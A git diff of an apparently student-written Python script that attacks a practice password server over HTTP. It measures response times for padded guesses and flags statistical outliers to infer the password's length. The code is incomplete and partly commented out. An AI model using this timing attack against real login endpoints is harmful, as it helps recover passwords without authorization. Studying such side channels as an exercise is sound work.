@@ -1,6 +1,8 @@
 import time
+from statistics import stdev
+
 import requests
-import numpy as np
+
 # from HuckIt import find_pass_len, find_tav
 
 
@@ -20,14 +22,43 @@ def find_pass_len(url, MAX_LEN):
         executed_url = url + '/' + ("").ljust(num, '*')# defining the password to sent
         time_values.append(min(timeit(executed_url, 5)))# add the time it took to the current password
         print(f'checking length: {num} the time it took: {time_values[-1]}')
-    standart_devitation = np.std(time_values)# getting the standart_devitation from the list
-    average = np.mean(time_values)# getting the average from the list
-    for curr_time in time_values:# running over the times to checks if there is one which unusual
-        if curr_time - average > 1.5 * standart_devitation:
-            return time_values.index(curr_time)
+        if num>4:
+            standart_devitation = stdev(time_values)
+            average = sum(time_values) / len(time_values)  # getting the average from the list
+            possible_lens = []
+            for curr_time in time_values:# running over the times to checks if there is one which unusual
+                if curr_time - average > 1.5 * standart_devitation:
+                    print(f'the difference is {curr_time - average}')
+                    return time_values.index(curr_time)
+        
+    # standart_devitation = stdev(time_values)# getting the standart_devitation from the list
+    # print(standart_devitation)
+    average = sum(time_values)/len(time_values)# getting the average from the list
+    possible_lens = []
+    # for curr_time in time_values:# running over the times to checks if there is one which unusual
+    #     if curr_time - average > 0.8 * standart_devitation:
+    #         print(f'the difference is {curr_time - average}')
+    #         return time_values.index(curr_time)
+
+     #each time that the legnth is bigger than the right length the response time is raising so we want to return the first time it raised
+
+def find_tav():
+    time_values = []
+    # while len(possible_lens) > 1:
+    #     start_length = len(possible_len)
+    #     for possible_len in possible_lens:
+    #         executed_url = url + '/' + ("").ljust(possible_len, '*')  # defining the password to sent
+    #         curr_time = min(timeit(executed_url, 5))
+    #         if average - curr_time > standart_devitation:
+    #             possible_lens.append(possible_len)
+    #         print(f'checking length: {possible_len} the time it took: {curr_time}')
+    #     possible_lens = possible_lens[start_length:]
+
+
+
 
 if __name__ == '__main__':
-    GAL_SITE = True
+    GAL_SITE = False
 
     if GAL_SITE:
         url = r'https://verifyserver.herokuapp.com/index'
@@ -35,7 +66,7 @@ if __name__ == '__main__':
         # POOL_SHORT = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
     else:
-        url = "https://passwordserver.herokuapp.com/"
+        url = "https://passwordserver.herokuapp.com/123"
 
         POOL = '0123456789'
 
